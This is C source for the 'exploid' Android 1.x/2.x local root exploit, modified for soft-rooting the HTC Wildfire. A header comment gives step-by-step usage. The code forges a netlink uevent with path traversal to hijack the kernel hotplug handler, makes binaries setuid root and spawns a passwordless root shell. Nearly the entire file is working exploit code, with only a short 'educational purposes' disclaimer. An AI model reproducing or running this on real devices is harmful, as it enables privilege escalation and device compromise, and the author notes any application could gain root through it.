/* android 1.x/2.x the real youdev feat. init local root exploit.
 *
 *
 * Modifications to original exploit for HTC Wildfire Stage 1 soft-root (c) 2010 Martin Paul Eve
 * Changes:
 * -- Will not remount /system rw (NAND protection renders this pointless)
 * -- Doesn't copy self, merely chmods permissions of original executable
 * -- No password required for rootshell (designed to be immediately removed once su binary is in place)
 *
 * Revised usage instructions:
 * -- Copy to /sqlite_stmt_journals/exploid and /sqlite_stmt_journals/su
 * -- chmod exploid to 755
 * -- Execute the binary
 * -- Enable or disable a hotplug item (wifi, bluetooth etc. -- this could be done automatically by an app that packaged this exploit) -- don't worry that it segfaults
 * -- Execute it again to gain rootshell
 * -- Copy to device (/sqlite_stmt_journals/) + chown/chmod su to 04711
 * -- Delete original exploid
 * -- Use modified Superuser app with misplaced su binary
 *
 * Explanatory notes:
 * -- This is designed to be used with a modified superuser app (not yet written) which will use the su binary in /sqlite_stmt_journals/
 * -- It is important that you delete the original exploid binary because, otherwise, any application can gain root
 *
 * Original copyright/usage information
 *
 * (C) 2009/2010 by The Android Exploid Crew.
 *
 * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.
 * Or use /data/local/tmp if available (thx to ioerror!) It is important to
 * to use /sqlite_stmt_journals directory if available.
 * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}
 * or use USB keys etc. This will invoke hotplug which is actually
 * our exploit making /system/bin/rootshell.
 * This exploit requires /etc/firmware directory, e.g. it will
 * run on real devices and not inside the emulator.
 * I'd like to have this exploitet by using the same blockdevice trick
 * as in udev, but internal structures only allow world writable char
 * devices, not block devices, so I used the firmware subsystem.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 *
 * Thx to all the TAEC supporters.
 *
 */
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>

void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

void clear_hotplug()
{
	int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
	write(ofd, "", 1);
	close(ofd);
}

void rootshell(char **env)
{
	char pwd[128];
	char *sh[] = {"/system/bin/sh", 0};

	setuid(0); setgid(0);
	execve(*sh, sh, env);
	die("[-] execve");
}


int main(int argc, char **argv, char **env)
{
	char buf[512], path[512];
	int ofd;
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock;
	char *basedir = NULL, *logmessage;


	/* I hope there is no LD_ bug in androids rtld :) */
	if (geteuid() == 0 && getuid() != 0)
		rootshell(env);

	if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
		die("[-] readlink");

	if (geteuid() == 0) {
		clear_hotplug();

		chown(path, 0, 0);
		chmod(path, 04711);

		chown("/sqlite_stmt_journals/su", 0, 0);
		chmod("/sqlite_stmt_journals/su", 06755);

		return 0;
	}

	printf("[*] Android local root exploid (C) The Android Exploid Crew\n");
	printf("[*] Modified by Martin Paul Eve for Wildfire Stage 1 soft-root\n");

	basedir = "/sqlite_stmt_journals";
	if (chdir(basedir) < 0) {
		basedir = "/data/local/tmp";
		if (chdir(basedir) < 0)
			basedir = strdup(getcwd(buf, sizeof(buf)));
	}
	printf("[+] Using basedir=%s, path=%s\n", basedir, path);
	printf("[+] opening NETLINK_KOBJECT_UEVENT socket\n");

	memset(&snl, 0, sizeof(snl));
	snl.nl_pid = 1;
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");

	close(creat("loading", 0666));
	if ((ofd = creat("hotplug", 0644)) < 0)
		die("[-] creat");
	if (write(ofd, path , strlen(path)) < 0)
		die("[-] write");
	close(ofd);
	symlink("/proc/sys/kernel/hotplug", "data");
	snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
	         "SUBSYSTEM=firmware%c"
	         "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
	printf("[+] sending add message ...\n");
	if (sendmsg(sock, &msg, 0) < 0)
		die("[-] sendmsg");
	close(sock);
	printf("[*] Try to invoke hotplug now, clicking at the wireless\n"
	       "[*] settings, plugin USB key etc.\n"
	       "[*] You succeeded if you find /system/bin/rootshell.\n"
	       "[*] GUI might hang/restart meanwhile so be patient.\n");
	return 0;
}